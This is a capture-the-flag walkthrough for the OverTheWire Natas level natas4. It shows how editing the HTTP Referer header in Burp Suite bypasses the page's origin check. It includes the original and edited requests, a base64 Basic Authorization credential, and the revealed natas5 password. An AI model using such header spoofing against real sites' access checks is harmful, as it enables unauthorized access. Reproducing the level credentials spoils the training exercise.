Username: natas5

URL:      http://natas5.natas.labs.overthewire.org

```html
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```
when we click on refresh pages which calls index.php

```html
<div id="content">

Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

So we need to edit refer in header using burp suite

Original Headers when I clicked on Refresh Page
```text
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://natas4.natas.labs.overthewire.org/
Cookie: __cfduid=d3b3b32b56dd20d295885a2d4872a2aff1506973072
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
After Editing
```text
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://natas5.natas.labs.overthewire.org/
Cookie: __cfduid=d3b3b32b56dd20d295885a2d4872a2aff1506973072
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

The Flag is here 
```html
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```
